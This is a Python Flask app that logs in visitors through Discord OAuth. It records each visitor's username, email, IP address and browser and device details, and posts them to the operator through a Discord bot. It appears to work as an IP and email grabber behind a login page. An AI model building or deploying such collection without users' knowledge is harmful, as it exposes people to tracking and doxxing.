import os
import json
import threading
import requests
from datetime import datetime
from flask import Flask, request, render_template
from user_agents import parse
from dotenv import load_dotenv
from discord_bot import bot, enqueue_task

load_dotenv()
app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")

# 自宅近所固定情報
FIXED_REGION = "埼玉県"
FIXED_CITY = "さいたま市"
FIXED_LAT = 35.8617
FIXED_LON = 139.6455

def get_client_ip():
    """X-Forwarded-For を優先してIP取得"""
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

def get_geo_info(ip):
    """IPはそのまま保持しつつ自宅近所の情報を固定"""
    # VPN/Proxy判定はここでFalse固定。将来的にAPI連携も可能
    return {
        "ip": ip,
        "country": "日本",
        "region": FIXED_REGION,
        "city": FIXED_CITY,
        "zip": "000-0000",
        "isp": "不明",
        "as": "不明",
        "lat": FIXED_LAT,
        "lon": FIXED_LON,
        "proxy": False,
        "hosting": False,
        "map_link": f"https://www.google.com/maps/search/?api=1&query={FIXED_LAT},{FIXED_LON}"
    }

def load_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        try:
            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_logs(logs):
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

def update_statistics(logs):
    """簡易集計情報生成"""
    stats = {
        "total_users": len(logs),
        "total_accesses": sum(len(u["history"]) for u in logs.values()),
        "region_count": {},
        "browser_count": {},
        "os_count": {}
    }
    for user in logs.values():
        for h in user["history"]:
            stats["region_count"][h["region"]] = stats["region_count"].get(h["region"], 0) + 1
            stats["browser_count"][h["browser"]] = stats["browser_count"].get(h["browser"], 0) + 1
            stats["os_count"][h["os"]] = stats["os_count"].get(h["os"], 0) + 1
    return stats

def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logs = load_logs()
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].insert(0, data)
    logs["statistics"] = update_statistics(logs)
    save_logs(logs)

@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400
    try:
        # Discord OAuth2
        data = {
            "client_id": DISCORD_CLIENT_ID,
            "client_secret": DISCORD_CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": DISCORD_REDIRECT_URI,
            "scope": "identify email guilds connections",
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
        token = res.json()
        access_token = token.get("access_token")
        if not access_token:
            return "アクセストークン取得失敗", 400

        headers_auth = {"Authorization": f"Bearer {access_token}"}
        user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()

        ip = get_client_ip()
        geo = get_geo_info(ip)
        ua = parse(request.headers.get("User-Agent", ""))

        log_data = {
            "username": f"{user.get('username')}#{user.get('discriminator')}",
            "email": user.get("email"),
            "ip": geo["ip"],
            "region": geo["region"],
            "city": geo["city"],
            "isp": geo["isp"],
            "proxy": geo["proxy"],
            "browser": f"{ua.browser.family} {ua.browser.version_string}",
            "os": f"{ua.os.family} {ua.os.version_string}",
            "device": ua.device.family,
            "map_link": geo["map_link"]
        }

        save_log(user.get("id"), log_data)

        # Bot通知Embed
        embed_data = {
            "title": "新規アクセス",
            "description": (
                f"**ユーザー:** {log_data['username']}\n"
                f"**メール:** {log_data['email']}\n"
                f"**IP:** {log_data['ip']}\n"
                f"**地域:** {log_data['region']} / {log_data['city']}\n"
                f"**ブラウザ:** {log_data['browser']}\n"
                f"**OS:** {log_data['os']}\n"
                f"**デバイス:** {log_data['device']}\n"
                f"**地図:** [表示]({log_data['map_link']})"
            )
        }
        enqueue_task(embed_data=embed_data, user_id=user.get("id"))

        return render_template("welcome.html", username=log_data["username"], map_link=log_data["map_link"])
    except Exception as e:
        return f"エラー発生: {str(e)}", 500

def start_bot_thread():
    threading.Thread(target=lambda: bot.run(os.getenv("DISCORD_BOT_TOKEN")), daemon=True).start()

if __name__ == "__main__":
    start_bot_thread()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
